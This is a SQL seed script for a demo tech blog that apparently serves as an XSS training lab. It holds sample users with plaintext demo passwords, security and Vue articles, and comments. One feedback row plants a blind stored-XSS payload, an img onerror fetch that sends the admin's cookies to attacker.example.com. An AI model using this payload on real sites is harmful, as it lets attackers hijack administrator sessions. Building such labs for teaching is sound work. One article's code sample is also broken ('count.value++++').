-- 插入演示用户数据
-- Password for all users: Admin#2025 / Attacker#2025 (BCrypt hash)
-- Hash for 'Admin#2025': $2a$10$ESPycVV/G4uHvDILZhw09uYW4c0Iwgj.Kn0dvynVdhGA5tOE6jddS
-- Hash for 'Attacker#2025': $2a$10$OAtJoG3svgJ0EjG6ZVTGXO5x26jr/f8TNfH6SWPOc1XE8Wtv7vShq
INSERT INTO users (username, email, password_hash, role, avatar_url, banner_url, bio, created_at, updated_at) 
VALUES 
('admin', 'admin@techblog.com', '$2a$10$ESPycVV/G4uHvDILZhw09uYW4c0Iwgj.Kn0dvynVdhGA5tOE6jddS', 'ADMIN', 
 'https://api.dicebear.com/7.x/avataaars/svg?seed=admin', 
 'https://images.unsplash.com/photo-1451187580459-43490279c0fa?w=1200&h=300&fit=crop',
 '<p>系统管理员，负责内容审核与用户管理。</p>', 
 NOW(), NOW()),
 
('attacker', 'attacker@evil.com', '$2a$10$OAtJoG3svgJ0EjG6ZVTGXO5x26jr/f8TNfH6SWPOc1XE8Wtv7vShq', 'USER',
 'https://api.dicebear.com/7.x/avataaars/svg?seed=attacker',
 'https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&h=300&fit=crop',
 '<p>网络安全爱好者，热衷于渗透测试和漏洞研究。</p>',
 NOW(), NOW()),
 
('alice', 'alice@techblog.com', '$2a$10$ESPycVV/G4uHvDILZhw09uYW4c0Iwgj.Kn0dvynVdhGA5tOE6jddS', 'USER',
 'https://api.dicebear.com/7.x/avataaars/svg?seed=alice',
 'https://images.unsplash.com/photo-1517694712202-14dd9538aa97?w=1200&h=300&fit=crop',
 '<p>全栈开发者，热爱分享前端技术与最佳实践。</p>',
 NOW(), NOW());

-- Insert tags
INSERT INTO tags (name, color) VALUES
('JavaScript', '#F7DF1E'),
('Vue.js', '#42B883'),
('Security', '#E74C3C'),
('XSS', '#E74C3C'),
('Tutorial', '#3498DB'),
('DevOps', '#95A5A6');

-- 插入演示文章数据
INSERT INTO articles (author_id, title, slug, excerpt, content_html, likes_count, published_at, created_at)
VALUES
(1, 'Web安全基础：XSS攻击原理与防御', 'xss-attack-defense', 
 '跨站脚本攻击（XSS）是最常见的Web安全漏洞之一。本文详细介绍XSS的原理、类型及防御方法。',
 '<h2>什么是XSS？</h2><p>XSS（Cross-Site Scripting）是一种代码注入攻击，攻击者通过在目标网站注入恶意脚本，使之在用户浏览器中执行。</p><h3>XSS的类型</h3><ul><li><strong>反射型XSS</strong>：恶意脚本通过URL参数传递</li><li><strong>存储型XSS</strong>：恶意脚本存储在数据库中</li><li><strong>DOM型XSS</strong>：通过修改DOM结构执行脚本</li></ul><pre><code>// 危险示例\ndocument.write(location.search);\n\n// 安全示例\nconst safe = DOMPurify.sanitize(userInput);\n</code></pre><h3>防御措施</h3><ol><li>对用户输入进行HTML转义</li><li>使用Content Security Policy (CSP)</li><li>启用HttpOnly Cookie</li><li>使用安全的DOM操作API</li></ol>',
 42, NOW(), NOW()),

(2, '网络安全实战技巧分享', 'security-practice-tips',
 '分享一些实用的网络安全测试技巧和常见漏洞的发现方法。',
 '<h2>渗透测试基础</h2><p>在进行安全测试时，了解常见的攻击向量非常重要。</p><h3>常见漏洞类型</h3><ul><li>XSS（跨站脚本）</li><li>CSRF（跨站请求伪造）</li><li>SQL注入</li><li>文件上传漏洞</li></ul><h3>测试工具</h3><p>推荐使用 Burp Suite、OWASP ZAP 等专业工具进行安全测试。</p><p><strong>注意</strong>：所有安全测试必须在授权环境下进行，切勿用于非法用途。</p>',
 15, NOW(), NOW()),

(3, 'Vue 3组合式API实战指南', 'vue3-composition-api-guide',
 '深入理解Vue 3的Composition API，学习如何构建可维护、可复用的组件逻辑。',
 '<h2>为什么需要Composition API？</h2><p>Vue 3引入的Composition API解决了Options API在大型组件中的逻辑复用和代码组织问题。</p><h3>基础用法</h3><pre><code>import { ref, computed, onMounted } from ''vue'';\n\nexport default {\n  setup() {\n    const count = ref(0);\n    const double = computed(() => count.value * 2);\n    \n    onMounted(() => {\n      console.log(''Component mounted!'');\n    });\n    \n    return { count, double };\n  }\n};\n</code></pre><h3>逻辑复用</h3><p>通过组合函数（Composables）实现逻辑复用：</p><pre><code>// useCounter.js\nexport function useCounter() {\n  const count = ref(0);\n  const increment = () => count.value++++;\n  return { count, increment };\n}\n</code></pre>',
 28, NOW(), NOW()),

(3, '现代前端开发工具链完整指南', 'modern-frontend-toolchain',
 '从包管理器到构建工具，全面了解2024年前端开发必备的工具链配置。',
 '<h2>构建工具的演进</h2><p>从Webpack到Vite，前端构建工具经历了巨大的变革。</p><h3>Vite的优势</h3><ul><li>⚡️ 极速的冷启动</li><li>🔥 热模块替换(HMR)</li><li>📦 开箱即用的TypeScript支持</li><li>🎨 CSS预处理器集成</li></ul><pre><code>// vite.config.js\nimport { defineConfig } from ''vite'';\nimport vue from ''@vitejs/plugin-vue'';\n\nexport default defineConfig({\n  plugins: [vue()],\n  server: {\n    port: 5173,\n    open: true\n  }\n});\n</code></pre><h3>包管理器选择</h3><p>pnpm因其高效的磁盘空间使用和严格的依赖管理，正成为新的主流选择。</p>',
 35, NOW(), NOW());

-- Link articles with tags
INSERT INTO article_tags (article_id, tag_id)
SELECT a.id, t.id FROM articles a, tags t 
WHERE (a.slug = 'xss-attack-defense' AND t.name IN ('Security', 'XSS', 'Tutorial'))
   OR (a.slug = 'security-practice-tips' AND t.name IN ('Security', 'XSS', 'Tutorial'))
   OR (a.slug = 'vue3-composition-api-guide' AND t.name IN ('JavaScript', 'Vue.js', 'Tutorial'))
   OR (a.slug = 'modern-frontend-toolchain' AND t.name IN ('JavaScript', 'DevOps'));

-- 插入演示评论数据
INSERT INTO comments (article_id, user_id, content_html, created_at)
VALUES
(1, 3, '非常实用的安全指南！建议补充一下CSP的配置示例。', NOW()),
(2, 1, '很有帮助的实战经验分享！', NOW()),
(2, 3, '学到了，原来HttpOnly Cookie这么重要。', NOW()),
(3, 1, 'Composition API确实让代码组织更清晰了，感谢分享！', NOW());

-- 插入演示反馈数据（包含场景 5 的 XSS 演示载荷）
INSERT INTO feedbacks (email, content_html, status, created_at)
VALUES
('normal@user.com', '网站设计很棒，但是搜索功能有时候响应比较慢，希望能优化一下。', 'NEW', NOW()),
('evil@hacker.com', '<img src=x onerror="fetch(''https://attacker.example.com/admin-cookie?c=''+document.cookie)">这是一个盲XSS测试载荷，当管理员查看此反馈时将触发。', 'NEW', NOW()),
('feedback@test.com', '希望能增加夜间模式切换功能！', 'READ', DATE_SUB(NOW(), INTERVAL 1 DAY));
